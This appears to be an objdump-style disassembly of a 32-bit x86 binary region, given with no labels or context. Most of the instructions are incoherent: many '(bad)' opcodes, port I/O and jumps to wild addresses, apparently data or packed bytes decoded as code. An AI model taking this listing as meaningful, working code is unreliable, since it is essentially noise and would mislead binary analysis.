  41012b:	add    BYTE PTR [edx+0x40],ah
  41012e:	sbb    esi,esi
  410130:	sub    esi,DWORD PTR [edi+0x3f228432]
  410136:	mov    BYTE PTR [ecx],al
  410138:	cmp    al,0xa7
  41013a:	xor    ch,BYTE PTR [edx]
  41013c:	xchg   esi,eax
  41013d:	in     al,0xe8
  41013f:	mov    ah,BYTE PTR [esi-0x79c50724]
  410145:	in     al,0x18
  410147:	jae    0x410122
  410149:	cwde   
  41014a:	add    BYTE PTR [ecx],cl
  41014c:	bound  eax,QWORD PTR [eax-0x7a]
  41014f:	jle    0x4100df
  410151:	inc    eax
  410152:	add    al,BYTE PTR [ecx+eiz*2+0x39000139]
  410159:	xchg   DWORD PTR [ebp-0x6261ff2],ebx
  41015f:	(bad)  
  410160:	in     eax,dx
  410161:	sbb    cl,BYTE PTR [ebp+0x141a223]
  410167:	add    bl,cl
  410169:	dec    esi
  41016a:	sbb    bh,dh
  41016c:	aad    0xc2
  41016e:	scas   eax,DWORD PTR es:[edi]
  41016f:	jnp    0x4101d3
  410171:	inc    edi
  410172:	test   ebx,esp
  410174:	add    BYTE PTR [edx+0x40],bl
  410177:	add    ebx,ebp
  410179:	retf   0xc8ba
  41017c:	and    ecx,DWORD PTR [edx+0x5223c8d9]
  410182:	inc    edi
  410183:	jle    0x410158
  410185:	pop    edx
  410186:	inc    eax
  410187:	add    DWORD PTR [ebx],edi
  410189:	cmp    eax,0x65e0b414
  41018e:	fstp   DWORD PTR [ebp+0x15]
  410191:	push   ecx
  410192:	sbb    DWORD PTR [edx+0x3e],esi
  410195:	loopne 0x4101ce
  410197:	out    dx,al
  410198:	ret    
  410199:	nop
  41019a:	cmp    BYTE PTR [edx-0x40],ah
  41019d:	inc    ecx
  41019e:	icebp  
  41019f:	test   al,0x1e
  4101a1:	pusha  
  4101a2:	call   0x736b:0xe6580863
  4101a9:	gs (bad) 
  4101ac:	jl     0x41018f
  4101ae:	std    
  4101af:	ret    
  4101b0:	add    ah,BYTE PTR [edx-0x27]
  4101b3:	pop    esi
  4101b4:	enter  0xe981,0xa7
  4101b8:	rcl    DWORD PTR [edi-0x66176cac],cl
  4101be:	(bad)  
  4101c0:	add    ebx,ecx
  4101c2:	cs ds js 0x410147
  4101c6:	mov    ch,0xe8
  4101c8:	add    esp,DWORD PTR [edx+0x60]
  4101cb:	and    bl,cl
  4101cd:	adc    al,0x8e
  4101cf:	retf   
  4101d0:	iret   
  4101d1:	(bad)  
  4101d2:	(bad)  
  4101d4:	xor    cl,dl
  4101d6:	std    
  4101d7:	mov    bl,0x2
  4101d9:	add    BYTE PTR [edx-0x27],ah
  4101dc:	push   cs
  4101dd:	js     0x410220
  4101df:	mov    ch,0xe8
  4101e1:	add    esp,DWORD PTR [edx+0x41]
  4101e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101e5:	dec    edx
  4101e6:	in     al,0x54
  4101e8:	ins    BYTE PTR es:[edi],dx
  4101e9:	inc    esp
  4101ea:	push   ecx
  4101eb:	imul   eax,DWORD PTR [eax],0xe654d6c1
  4101f1:	jp     0x41021c
  4101f3:	std    
  4101f4:	repz in al,dx
  4101f6:	popf   
  4101f7:	(bad)  
  4101f8:	das    
  4101f9:	in     eax,dx
  4101fa:	sbb    al,0xc5
  4101fc:	pop    edx
  4101fd:	frstor [ebx+ecx*4-0x26]
  410201:	hlt    
  410202:	in     eax,dx
  410203:	pusha  
  410204:	mov    cl,0x84
  410206:	ret    0xdc
  410209:	sub    DWORD PTR [edi],esi
  41020b:	xor    al,0x89
  41020d:	sbb    eax,0x93bfec8a
  410212:	pop    bp
  410214:	add    al,0xf3
  410216:	int    0x4
  410218:	mov    ch,BYTE PTR ds:0x2941e48a
  41021e:	stc    
  41021f:	xchg   edi,eax
  410220:	and    al,0xd9
  410222:	jle    0x4101bc
  410224:	and    al,0xd1
  410226:	mov    ch,0x2a
  410228:	jmp    0x7d13e904
  41022d:	jmp    0x857aee3f
  410232:	inc    ebp
  410233:	adc    al,0x0
  410235:	jmp    0x1a4ecd9b
  41023a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41023b:	adc    al,0x88
  41023d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41023e:	add    BYTE PTR ds:0x62c54611,ah
  410244:	rol    DWORD PTR fs:[esi+0x72],cl
  410248:	push   ebx
  410249:	cmp    DWORD PTR [ebp+0x6b0de805],edx
  41024f:	adc    al,0xdc
  410251:	add    cl,ch
  410253:	mov    ds,WORD PTR [eax+0x24]
  410256:	mov    ebp,0xa900d960
  41025b:	js     0x4101f5
  41025d:	and    al,0xd5
  41025f:	adc    DWORD PTR [esi-0x4ffac203],ebp
  410265:	(bad)  
  410266:	call   0xf71462cc
  41026b:	push   esp
  41026c:	clc    
  41026d:	pop    esp
  41026e:	call   0xb2cadbd4
  410273:	mov    ch,0x52
  410275:	mov    ah,0x5
  410277:	mov    dl,0xd8
  410279:	add    cl,ch
  41027b:	mov    WORD PTR [eax-0x26a0d2dc],cs
  410281:	add    BYTE PTR [eax],al
  410283:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410284:	shl    BYTE PTR [ecx],1
  410286:	pop    esp
  410287:	mov    edx,0xeae800d7
  41028c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41028d:	(bad)  
  41028e:	(bad)  
  41028f:	(bad)  
  410290:	pushf  
  410291:	push   cs
  410292:	test   DWORD PTR [edi],esi
  410294:	or     edi,edi
  410296:	call   DWORD PTR [eax]
  410298:	and    DWORD PTR [ecx],esp
  41029a:	xor    al,0x40
  41029c:	inc    eax
  41029d:	pop    ecx
  41029e:	and    al,0x6f
  4102a0:	xchg   BYTE PTR [ebx-0x23deff17],bh
  4102a6:	add    BYTE PTR [eax],al
  4102a8:	clc    
  4102a9:	cmp    DWORD PTR [ecx+0x0],0x44
  4102ad:	pop    ebx
  4102ae:	lods   eax,DWORD PTR ds:[esi]
  4102af:	pop    es
  4102b0:	dec    ebx
  4102b1:	xlat   BYTE PTR ds:[ebx]
  4102b2:	cmp    ecx,ebx
  4102b4:	push   esp
  4102b5:	pop    ebp
  4102b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102b7:	pop    es
  4102b8:	cmp    edx,edi
  4102ba:	aaa    
  4102bb:	push   edi
  4102bc:	pop    ss
  4102bd:	(bad)  
  4102be:	push   esi
  4102bf:	pop    esp
  4102c0:	mov    ds:0xa4ffe630,al
  4102c5:	into   
  4102c6:	and    DWORD PTR [edi+eax*8],0xcb0000dd
  4102cd:	out    dx,eax
  4102ce:	cmp    BYTE PTR [ebx+0x3b153aef],cl
  4102d4:	iret   
  4102d5:	cmp    cl,BYTE PTR ds:0x660760f
  4102db:	add    BYTE PTR [ebx],cl
  4102dd:	inc    eax
  4102de:	pop    esi
  4102df:	ins    BYTE PTR es:[edi],dx
  4102e0:	adc    al,0x58
  4102e2:	mov    edi,esi
  4102e4:	add    cl,BYTE PTR fs:[edi]
  4102e7:	mov    dh,0xf0
  4102e9:	iret   
  4102ea:	inc    esi
  4102eb:	xor    BYTE PTR [eax],cl
  4102ed:	push   esp
  4102ee:	mov    bl,0x4
  4102f0:	retf   0x4145
  4102f3:	and    al,0x5b
  4102f5:	push   edx
  4102f6:	test   BYTE PTR [edi-0x44],ah
  4102f9:	(bad)  
  4102fa:	add    BYTE PTR [ebx+0x5be5c462],cl
  410300:	arpl   WORD PTR [eax+0x1],ax
  410303:	inc    edx
  410304:	fcomi  st,st(4)
  410306:	call   0xf0630322
  41030b:	(bad)  
  41030c:	(bad)  
  41030d:	(bad)  
  41030e:	in     al,0xd0
  410310:	add    BYTE PTR [edx+0x40],ah
  410313:	jp     0x4102e9
  410315:	lea    esi,[ebp+eiz*8+0x140635b]
  41031c:	mov    ebp,DWORD PTR [ecx+0x3eb32e13]
  410322:	add    al,0x4
  410324:	add    BYTE PTR [edx+0x5b],ah
  410327:	jne    0x41034c
  410329:	push   es
  41032a:	inc    ecx
  41032b:	add    DWORD PTR [eax],eax
  41032d:	pop    ebp
  41032e:	adc    al,0xe6
  410330:	pop    ebx
  410331:	arpl   WORD PTR [eax+0x1],ax
  410334:	call   0xfe701681
  410339:	(bad)  
  41033b:	mov    ch,0x93
  41033d:	dec    ebx
  41033e:	inc    esp
  41033f:	sub    eax,0x85b735fe
  410344:	and    ecx,DWORD PTR [esi-0x5dfffebf]
  41034a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41034b:	out    dx,eax
  41034c:	mov    ch,BYTE PTR [esi-0x59c4f31c]
  410352:	fcom   QWORD PTR [edi+ecx*1]
  410355:	fild   WORD PTR [ebp+0x6]
  410358:	add    BYTE PTR [edx+0x37],ah
  41035b:	into   
  41035c:	imul   ebp,DWORD PTR [ebp-0x41],0x12
  410360:	(bad)  
  410361:	cmc    
  410362:	loop   0x410362
  410364:	mov    ch,0x61
  410366:	jg     0x410354
  410368:	inc    ebx
  410369:	ds and dh,bh
  41036c:	test   BYTE PTR [eax],al
  41036e:	rol    DWORD PTR [ecx+0x1],1
  410371:	add    cl,ch
  410373:	mov    ebx,0xd9635be5
  410378:	out    0x3,eax
  41037a:	and    esp,DWORD PTR [eax+0x2b]
  41037d:	call   0xd6789cd7
  410382:	mov    ah,0x8c
  410384:	add    edx,eax
  410386:	(bad)  
  410387:	(bad)  
  410389:	js     0x410319
  41038b:	push   ecx
  41038c:	jae    0x410376
  41038e:	cmp    eax,ebx
  410390:	out    0x3,eax
  410392:	jmp    0xd16e19b4
  410397:	cld    
  410398:	inc    ebx
  410399:	add    esp,DWORD PTR [edx-0x27]
  41039c:	sahf   
  41039d:	js     0x4103e0
  41039f:	mov    ch,0xe8
  4103a1:	add    esp,DWORD PTR [edx+0x52]
  4103a4:	push   ebx
  4103a5:	call   0x428dbb3
  4103aa:	jp     0x410406
  4103ac:	xchg   esi,eax
  4103ad:	sub    eax,0xb8a7575c
  4103b2:	clc    
  4103b3:	inc    edx
  4103b4:	push   edi
  4103b5:	sub    DWORD PTR [ecx+edx*2+0x72],ecx
  4103b9:	mov    BYTE PTR [ecx+0x6203e8ad],al
  4103bf:	cdq    
  4103c0:	inc    edx
  4103c1:	jmp    0x4103ab
  4103c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103c4:	add    edx,DWORD PTR [ecx+ebp*2]
  4103c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103c8:	or     ecx,DWORD PTR [edx*2+0x6206555e]
  4103cf:	fptan  
  4103d1:	int3   
  4103d2:	add    BYTE PTR [ecx+0xe8d6ae0],cl
  4103d8:	push   ecx
  4103d9:	es std 
  4103db:	iret   
  4103dc:	in     al,0x72
  4103de:	lds    ecx,FWORD PTR [ebp-0x64]
  4103e1:	out    0x75,al
  4103e3:	popa   
  4103e4:	fcmovbe st,st(0)
  4103e6:	mov    DWORD PTR [ecx-0x7],0xd76d87f6
  4103ed:	out    0x3,eax
  4103ef:	jmp    0xa60e0449
  4103f4:	fld    DWORD PTR [eax]
  4103f6:	jmp    0xd95659e
  4103fb:	outs   dx,BYTE PTR ds:[esi]
  4103fc:	cdq    
  4103fd:	push   eax
  4103fe:	aaa    
  4103ff:	(bad)  
  410400:	mov    WORD PTR [esi*1+0x6200d961],fs
  410407:	adc    al,0x4f
  410409:	mov    ah,0xd
  41040b:	xchg   edx,eax
  41040c:	fld    DWORD PTR [eax]
  41040e:	jmp    0xb696272d
  410413:	or     eax,0x61e85cfc
  410418:	fscale 
  41041a:	pop    ebp
  41041b:	jge    0x4103d1
  41041d:	(bad)  
  41041e:	call   0xcdf55484
  410423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410424:	fld    DWORD PTR [eax]
  410426:	jmp    0x8716e774
  41042b:	ss push ebp
  41042d:	shl    ch,0xf5
  410430:	inc    eax
  410431:	adc    esi,DWORD PTR [edx-0x7a]
  410434:	dec    edi
  410435:	mov    DWORD PTR [ebp+0x0],esp
  410438:	inc    ebp
  410439:	mov    ah,0xff
  41043b:	call   0x1c2a9da1
  410440:	mov    ebx,0x4af924a4
  410445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410446:	and    al,0xf1
  410448:	cs pop ebp
  41044a:	sbb    edi,ebp
  41044c:	popa   
  41044d:	fnstcw WORD PTR [ecx]
  41044f:	sahf   
  410450:	std    
  410451:	fiadd  WORD PTR [ecx-0x2b0baf3]
  410457:	ficom  WORD PTR [edi+0x1de041db]
  41045d:	cld    
  41045e:	and    dh,ch
  410460:	in     eax,0xdb
  410462:	push   es
  410463:	jmp    0xc5c568c9
  410468:	sbb    eax,0xfb0000d9
  41046d:	sbb    cl,BYTE PTR [eax+0x40eba74c]
  410473:	push   eax
  410474:	cmc    
  410475:	cld    
  410476:	mov    cl,0x24
  410478:	(bad)  
  41047a:	add    BYTE PTR [eax],al
  41047c:	push   eax
  41047d:	stos   BYTE PTR es:[edi],al
  41047e:	(bad)  
  41047f:	mov    ah,0x67
  410481:	and    DWORD PTR [eax],eax
  410483:	add    bl,cl
  410485:	into   
  410486:	retf   0x9c57
  410489:	enter  0x5c21,0xba
  41048d:	fild   DWORD PTR [eax]
  41048f:	call   DWORD PTR [edi]
  410491:	cmp    DWORD PTR [ecx+0x1],ebx
  410494:	mov    ebx,ebx
  410496:	std    
  410497:	mov    ah,0x67
  410499:	and    DWORD PTR [eax],eax
  41049b:	add    BYTE PTR [eax],al
  41049d:	jnp    0x410492
  41049f:	xchg   esi,eax
  4104a0:	(bad)  
  4104a1:	fadd   QWORD PTR [ebx]
  4104a3:	test   eax,eax
  4104a5:	push   edi
  4104a6:	pusha  
  4104a7:	call   0xff44d64d
  4104ac:	push   0xffffffe9
  4104ae:	in     eax,dx
  4104af:	cwde   
  4104b0:	cli    
  4104b1:	fadd   QWORD PTR [edx]
  4104b3:	mov    eax,DWORD PTR [edi+eiz*1+0x3b000017]
  4104ba:	sbb    ebp,eax
  4104bc:	jp     0x4104f8
  4104be:	fild   DWORD PTR [eax]
  4104c0:	mov    esi,edi
  4104c2:	cs or  eax,0x1d2ef73b
  4104c8:	jle    0x3b41092e
  4104ce:	ror    BYTE PTR [esi+0x6c],1
  4104d1:	pusha  
  4104d2:	pushf  
  4104d3:	push   cs
  4104d4:	and    edi,0x1
  4104d7:	(bad)  
  4104d8:	inc    DWORD PTR [eax+0x78182119]
  4104de:	std    
  4104df:	or     DWORD PTR [ebp-0x33],esi
  4104e2:	push   edi
  4104e3:	jle    0x4104fd
  4104e5:	bound  eax,QWORD PTR [eax-0x53]
  4104e8:	sbb    eax,0x560987d9
  4104ed:	xlat   BYTE PTR ds:[ebx]
  4104ee:	jg     0x4104f5
  4104f0:	push   eax
  4104f1:	xor    ecx,ebx
  4104f3:	cmp    eax,0x42277e7
  4104f8:	add    bh,ah
  4104fa:	add    dl,bh
  4104fc:	test   BYTE PTR [ecx],bh
  4104fe:	cmp    eax,0xe9000001
  410503:	add    al,0xe1
  410505:	bswap  ecx
  410507:	(bad)  
  410509:	dec    esi
  41050a:	dec    esi
  41050b:	jmp    0x410558
  41050d:	jbe    0x410490
  41050f:	retf   0x3a06
  410512:	and    eax,0x5117afdc
  410517:	add    cl,0x38
  41051a:	and    eax,0x1983fa1c
  41051f:	cmp    eax,0x3e80001
  410524:	add    al,0x3a
  410526:	sbb    eax,0x2d83fa15
  41052b:	xor    eax,0xfcd90001
  410530:	loopne 0x410549
  410532:	ins    DWORD PTR es:[edi],dx
  410533:	push   es
  410534:	inc    DWORD PTR [edx-0x7d3935de]
  41053a:	dec    edx
  41053b:	das    
  41053c:	cli    
  41053d:	xchg   BYTE PTR [esi+0x3dfe2ab7],dh
  410543:	aam    0x7f
  410545:	nop
  410546:	xor    al,0x80
  410548:	add    DWORD PTR [ebx-0x7c05c5d5],eax
  41054e:	pop    es
  41054f:	inc    eax
  410550:	add    DWORD PTR [eax],eax
  410552:	ins    DWORD PTR es:[edi],dx
  410553:	mov    dh,0x10
  410555:	add    eax,0xf8864062
  41055a:	pop    esi
  41055b:	xchg   BYTE PTR [ebx+eax*4],dl
  41055e:	or     ebx,ecx
  410560:	hlt    
  410561:	scas   eax,DWORD PTR es:[edi]
  410562:	pop    ebx
  410563:	pop    eax
  410564:	and    BYTE PTR [eax-0x18b20b00],al
  41056a:	cli    
  41056b:	out    0x4d,al
  41056d:	jecxz  0x410572
  41056f:	bound  edx,QWORD PTR [eax]
  410571:	jg     0x410516
  410573:	ins    BYTE PTR es:[edi],dx
  410574:	push   esp
  410575:	cmc    
  410576:	(bad)  
  410577:	aad    0x4d
  410579:	add    BYTE PTR [esi-0x33],dh
  41057c:	dec    ebp
  41057d:	out    0xee,eax
  41057f:	and    al,0xbd
  410581:	test   BYTE PTR [ebx+ecx*1-0x1dfc1827],0x11
  410589:	loop   0x410583
  41058b:	out    0x77,al
  41058d:	out    0x3,eax
  41058f:	bound  ebx,QWORD PTR [edx+0x4d9d8dd0]
  410595:	out    0x84,eax
  410597:	call   0xe7d4:0x9d7fe6df
  41059e:	add    esp,ecx
  4105a0:	dec    edi
  4105a1:	xbegin 0x4241b88
  4105a7:	bound  ebx,QWORD PTR [eax-0x70]
  4105aa:	fs ins DWORD PTR es:[edi],dx
  4105ac:	dec    ebp
  4105ad:	out    0x1c,eax
  4105af:	call   0xd23c860d
  4105b4:	int    0x6a
  4105b6:	sub    esi,DWORD PTR [ebp-0x3b]
  4105b9:	inc    BYTE PTR [edx+0x3e77a4a]
  4105bf:	bound  eax,QWORD PTR [eax-0x68]
  4105c2:	test   DWORD PTR [edx],edi
  4105c4:	loopne 0x41059f
  4105c6:	popf   
  4105c7:	loopne 0x41061b
  4105c9:	in     al,0xf8
  4105cb:	add    bh,ah
  4105cd:	ins    BYTE PTR es:[edi],dx
  4105ce:	jecxz  0x4105d3
  4105d0:	bound  ebx,QWORD PTR [edx+0x40]
  4105d3:	jg     0x4105f2
  4105d5:	dec    ebp
  4105d6:	out    0x1c,eax
  4105d8:	mov    al,0x58
  4105da:	add    BYTE PTR [eax],dh
  4105dc:	or     al,0xdc
  4105de:	sbb    BYTE PTR [edi+0x62],0xd9
  4105e2:	add    BYTE PTR [edx+0x49],ch
  4105e5:	fnsave [esi-0x4e]
  4105e8:	loopne 0x41063b
  4105ea:	sub    ecx,0x61
  4105ed:	fldl2t 
  4105ef:	fs addr16 xchg ebx,eax
  4105f2:	xor    al,0xff
  4105f4:	fstp   st(1)
  4105f6:	add    al,0x10
  4105f8:	or     DWORD PTR [ebp+edi*8-0xa],ecx
  4105fc:	dec    esi
  4105fd:	xchg   ebx,eax
  4105fe:	xor    al,0xf7
  410600:	(bad)
  410603:	rcr    BYTE PTR [ecx+0x7015455f],cl
  410609:	fdivr  st,st(7)
  41060b:	out    0x48,eax
  41060d:	mov    eax,0x5f7acefd
  410612:	inc    ebp
  410613:	std    
  410614:	push   ebx
  410615:	fdivr  st,st(7)
  410617:	out    0x76,eax
  410619:	out    0x89,eax
  41061b:	cs xchg edx,eax
  41061d:	inc    esi
  41061e:	add    al,0xe8
  410620:	jno    0x410664
  410622:	dec    ebp
  410623:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410624:	dec    edx
  410625:	dec    ebx
  410626:	mov    DWORD PTR [esi],esp
  410628:	jb     0x410670
  41062a:	add    al,0xe8
  41062c:	push   ecx
  41062d:	fadd   QWORD PTR [edi+ecx*8-0x2b39b00]
  410634:	jb     0x410613
  410636:	clc    
  410637:	pop    esp
  410638:	call   0x6083df9e
  41063d:	sbb    eax,0x2e2910f8
  410642:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410643:	std    
  410644:	popf   
  410645:	sbb    eax,0x61e8ffb0
  41064a:	pusha  
  41064b:	rcl    DWORD PTR [esi-0x43],cl
  41064e:	clc    
  41064f:	pop    esp
  410650:	call   0xcadfb6
  410655:	push   eax
  410656:	sub    esi,edi
  410658:	mov    ah,0x5f
  41065a:	and    DWORD PTR [eax],eax
  41065c:	add    bl,bh
  41065e:	add    BYTE PTR [edx+0xd6d724],dh
  410664:	add    BYTE PTR [esp+edi*4+0x21],al
  410668:	pop    esp
  410669:	or     bl,al
  41066b:	add    al,ch
  41066d:	sub    bl,BYTE PTR [esi+edi*8+0xe987eff]
  410674:	test   BYTE PTR [edx+eax*1],dl
  410677:	(bad)  
  410678:	push   DWORD PTR [edx-0x57]
  41067b:	cmc    
  41067c:	call   esp
  41067e:	iret   
  41067f:	push   esi
  410680:	or     al,0x40
  410682:	jl     0x4106a5
  410684:	sub    al,0x30
  410686:	push   ecx
  410687:	jg     0x410614
  410689:	jg     0x4106e2
  41068b:	add    DWORD PTR [ecx-0x74c6c679],ecx
  410691:	inc    esp
  410692:	in     eax,0x29
  410694:	into   
  410695:	add    BYTE PTR [edx],dl
  410697:	sbb    DWORD PTR [ecx],esp
  410699:	cmp    BYTE PTR [eax],dl
  41069b:	(bad)  [edx+0xd393f89]
  4106a1:	mov    edi,esp
  4106a3:	pop    eax
  4106a4:	std    
  4106a5:	dec    DWORD PTR [ebx-0x70dbbe34]
  4106ab:	into   
  4106ac:	ret    0x3c2b
  4106af:	ins    DWORD PTR es:[edi],dx
  4106b0:	add    al,BYTE PTR [bp+si]
  4106b3:	(bad)  [edx+0x5d39d78b]
  4106b9:	add    DWORD PTR [ebx-0x29],ecx
  4106bc:	xor    eax,eax
  4106be:	mov    eax,0x59182181
  4106c3:	pop    ds
  4106c4:	push   cs
  4106c5:	inc    esp
  4106c6:	mov    DWORD PTR [eax+ecx*4],edx
  4106c9:	inc    esp
  4106ca:	pop    edi
  4106cb:	jmp    0xdca35357
  4106d0:	fcom   DWORD PTR [eax-0x6e]
  4106d3:	fwait
  4106d4:	jo     0x4106f9
  4106d6:	mov    esi,0x65000141
  4106db:	ret    0xffbf
  4106de:	or     al,0xcd
  4106e0:	loopne 0x41073d
  4106e2:	arpl   WORD PTR [eax+0x1],ax
  4106e5:	(bad)  
  4106e7:	shl    BYTE PTR [esi+ecx*2-0x131bf5e],1
  4106ee:	mov    dh,0x1c
  4106f0:	lds    eax,FWORD PTR [eax]
  4106f2:	bound  eax,QWORD PTR [eax+0x2]
  4106f5:	aad    0xdd
  4106f7:	or     al,0xe1
  4106f9:	pop    ebx
  4106fa:	add    BYTE PTR [ebx+0x40],ah
  4106fd:	add    DWORD PTR [ebx+0x236d4399],ecx
  410703:	es inc ecx
  410705:	add    DWORD PTR [eax],eax
  410707:	retf   0x50f9
  41070a:	(bad)  
  41070b:	mov    ch,0xc7
  41070d:	push   ecx
  41070e:	test   BYTE PTR [eax-0x577f0354],dl
  410714:	cmp    ah,BYTE PTR ds:0xdc0d9dfe
  41071a:	mov    bl,BYTE PTR [esi]
  41071c:	aam    0xf0
  41071e:	mov    ch,ah
  410720:	mov    esp,0x2b620001
  410725:	imul   ecx,DWORD PTR [ebx+eiz*2+0x43],0x6b
  41072a:	inc    esp
  41072b:	pusha  
  41072c:	and    DWORD PTR [edi+eax*1],0xe9027859
  410733:	loop   0x410712
  410735:	add    al,0x54
  410737:	xlat   BYTE PTR ds:[ebx]
  410738:	xor    DWORD PTR [edx+0x43],edi
  41073b:	jle    0x410761
  41073d:	jp     0x41078a
  41073f:	xchg   BYTE PTR [edx+ebx*1],dl
  410742:	mov    ds,ecx
  410744:	jge    0x410762
  410746:	or     eax,0x2666d93a
  41074b:	call   0x89bbf2e1
  410750:	cmc    
  410751:	adc    edi,DWORD PTR [ecx+0x59]
  410754:	add    esp,DWORD PTR [ecx+0x7]
  410757:	jmp    0x3ac:0xe8f7ae5d
  41075e:	in     al,dx
  41075f:	add    dl,bl
  410761:	lods   al,BYTE PTR ds:[esi]
  410762:	pop    edi
  410763:	(bad)  
  410764:	fcomp  DWORD PTR [ecx-0x225b8529]
  41076a:	shl    BYTE PTR ds:0x13c3c4e8,cl
  410770:	fild   DWORD PTR [eax+eiz*2]
  410773:	test   bl,ch
  410775:	jmp    0x7af4:0xc4dc260b
  41077c:	loope  0x410772
  41077e:	mov    ds:0x60d96204,eax
  410783:	jle    0x41076e
  410785:	fsub   st,st(7)
  410787:	add    esi,DWORD PTR [ecx+0x19]
  41078a:	sar    BYTE PTR [ecx],1
  41078c:	lods   al,BYTE PTR ds:[esi]
  41078d:	dec    ecx
  41078e:	fidivr WORD PTR [ecx-0x1f]
  410791:	hlt    
  410792:	xor    eax,DWORD PTR [ebx]
  410794:	(bad)  
  410795:	fldenv [edx+0x70]
  410798:	inc    ecx
  410799:	xchg   ebp,eax
  41079a:	call   0x17da69a2
  41079f:	cmc    
  4107a0:	xlat   BYTE PTR ds:[ebx]
  4107a1:	xchg   ebx,eax
  4107a2:	out    0xd1,eax
  4107a4:	test   BYTE PTR [ebx+eax*1-0x18269d38],al
  4107ab:	hlt    
  4107ac:	scas   eax,DWORD PTR es:[edi]
  4107ad:	push   0xd92db507
  4107b2:	xchg   esi,eax
  4107b3:	jo     0x4107f6
  4107b5:	lods   eax,DWORD PTR ds:[esi]
  4107b6:	call   0x9d1d69be
  4107bb:	int    0x54
  4107bd:	mov    es,ebx
  4107bf:	(bad)  
  4107c0:	(bad)  
  4107c1:	fld    DWORD PTR [eax]
  4107c3:	jmp    0x5654d1c8
  4107c8:	outs   dx,BYTE PTR ds:[esi]
  4107c9:	mov    dl,0xfc
  4107cb:	pop    esp
  4107cc:	call   0xd529e132
  4107d1:	xchg   edx,eax
  4107d2:	inc    edi
  4107d3:	std    
  4107d4:	ins    BYTE PTR es:[edi],dx
  4107d5:	sahf   
  4107d6:	xlat   BYTE PTR ds:[ebx]
  4107d7:	sub    DWORD PTR [ecx+0x4f],0x47
  4107db:	std    
  4107dc:	jo     0x410765
  4107de:	fs add cl,ch
  4107e1:	popa   
  4107e2:	xor    dh,BYTE PTR [ebx+0x3e]
  4107e5:	aas    
  4107e6:	inc    edi
  4107e7:	mov    DWORD PTR [ebp+0x2],esp
  4107ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107eb:	(bad)  
  4107ec:	call   0x1e91a152
  4107f1:	jb     0x4107ef
  4107f3:	pop    esp
  4107f4:	call   0x574ee15a
  4107f9:	sbb    eax,0xc23dfe49
  4107fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107ff:	(bad)  
  410800:	call   0x69f7e066
  410805:	(bad)  
  410806:	xchg   edi,eax
  410807:	inc    eax
  410808:	jmp    0x45659493
  41080d:	popa   
  41080e:	fld    DWORD PTR [eax]
  410810:	ins    BYTE PTR es:[edi],dx
  410811:	pushf  
  410812:	ficom  DWORD PTR [ebp-0x2a]
  410815:	xor    eax,0x61e85cfc
  41081a:	fld    DWORD PTR [edi+0x52f4821d]
  410820:	out    dx,al
  410821:	jmp    FWORD PTR [edi+edi*8+0x1a944e9]
  410828:	cdq    
  410829:	add    dl,bh
  41082b:	adc    ch,al
  41082d:	add    BYTE PTR [ebx],dl
  41082f:	inc    edi
  410830:	std    
  410831:	jb     0x410808
  410833:	cld    
  410834:	adc    al,0x60
  410836:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410837:	cld    
  410838:	xor    al,0xcc
  41083a:	fs inc ebp
  41083c:	std    
  41083d:	add    ah,bl
  41083f:	jbe    0x410861
  410841:	call   DWORD PTR [esp+ecx*4+0x54]
  410845:	jmp    DWORD PTR [esi]
  410847:	jo     0x41085c
  410849:	inc    eax
  41084a:	dec    ebx
  41084b:	adc    ebx,DWORD PTR [eax-0x7b]
  41084e:	mov    esi,DWORD PTR [edi+0xc]
  410851:	mov    esp,ebp
  410853:	mov    esi,DWORD PTR [ebp-0x10270e4]
  410859:	jmp    0x3ffd69
  41085e:	nop
  41085f:	mov    BYTE PTR [ecx],ah
  410861:	xor    al,0x62
  410863:	mov    dh,0x99
  410865:	add    bl,bh
  410867:	fisttp DWORD PTR ds:0xfef63b85
  41086d:	push   DWORD PTR [edx-0x53]
  410870:	cdq    
  410871:	add    bl,bh
  410873:	(bad)  
  410875:	in     eax,0x45
  410877:	std    
  410878:	dec    BYTE PTR [ebx+0x1592847]
  41087e:	retf   
  41087f:	fild   DWORD PTR [eax+0x50]
  410882:	int3   
  410883:	mov    dh,0x21
  410885:	pop    esp
  410886:	mov    edx,0x750f00db
  41088b:	xchg   ebp,edi
  41088d:	inc    BYTE PTR [eax]
  41088f:	xlat   BYTE PTR ds:[ebx]
  410890:	xor    BYTE PTR [ecx+0x1],bl
  410893:	mov    ebx,0x2bb60ddb
  410898:	jge    0x4108e8
  41089a:	inc    eax
  41089b:	mov    edi,edx
  41089d:	mov    cl,0x24
  41089f:	aas    
  4108a0:	fiadd  WORD PTR [eax]
  4108a2:	add    BYTE PTR [eax+0x0],bh
  4108a5:	push   edi
  4108a6:	inc    DWORD PTR [edi]
  4108a8:	xor    DWORD PTR [ecx+0x1],ebx
  4108ab:	mov    ebx,ebx
  4108ad:	std    
  4108ae:	mov    ah,0xa7
  4108b0:	xchg   DWORD PTR [eax],eax
  4108b2:	add    BYTE PTR [ebx-0x74],bh
  4108b5:	mov    cl,bl
  4108b7:	bound  ebx,QWORD PTR [edx+0x74]
  4108ba:	rcr    DWORD PTR [ebp+0x58],1
  4108bd:	xchg   DWORD PTR [edi-0xa824a9b],edi
  4108c3:	dec    ebp
  4108c4:	enter  0x1962,0x46
  4108c8:	shl    BYTE PTR [ecx],1
  4108ca:	call   0x423adc
  4108cf:	jmp    0x639cf188
  4108d4:	xor    BYTE PTR [ecx],al
  4108d6:	inc    eax
  4108d7:	xchg   edx,eax
  4108d8:	scas   eax,DWORD PTR es:[edi]
  4108d9:	pop    eax
  4108da:	and    edi,DWORD PTR [esi+0x65000131]
